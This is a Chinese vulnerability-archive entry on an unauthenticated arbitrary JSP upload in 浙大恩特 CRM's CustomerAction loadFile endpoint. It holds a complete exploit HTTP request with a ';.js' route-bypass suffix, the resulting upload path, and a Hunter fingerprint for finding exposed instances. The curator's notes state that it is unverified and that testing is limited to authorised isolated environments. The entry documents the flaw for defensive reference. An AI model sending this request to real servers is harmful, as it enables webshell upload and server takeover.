---
source: "wy876 漏洞文库"
title: "浙大恩特CRM CustomerAction loadFile上传JSP"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "固定客户目录gesnum00003509，版本未知"
prerequisites: ";.js后缀疑绕过，无Cookie请求"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/emyt65hk122k6rpq"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMloadFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-80dfcc40fdcec2e3d0aaf03a"
entity_id: "ve-80dfcc40fdcec2e3d0aaf03a"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 浙大恩特CRM CustomerAction loadFile上传JSP

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：浙大恩特CRM；CustomerAction loadFile上传JSP
- 版本、配置及部署条件：固定客户目录gesnum00003509，版本未知
- 认证与权限前提：;.js后缀疑绕过，无Cookie请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求JSP打印test但缺上传返回和GET内容，目录客户编号是实例数据非固定通用路径
- CustomerAction方法与418编辑器上传不同，整合公共介绍保留独立入口
- 路由绕过、目录可写/可执行权限、修复和副作用需补

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM loadFile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 203

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="as.jsp"
Content-Type: image/jpeg

<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

> 请求长度说明：原资料 Content-Length 为 203；保留原始标头；其数值未据实际请求体重新计算或验证。


根据响应可知上传文件位置

```plain
  /enterdoc/gesnum/00003509/photo/as.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/emyt65hk122k6rpq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
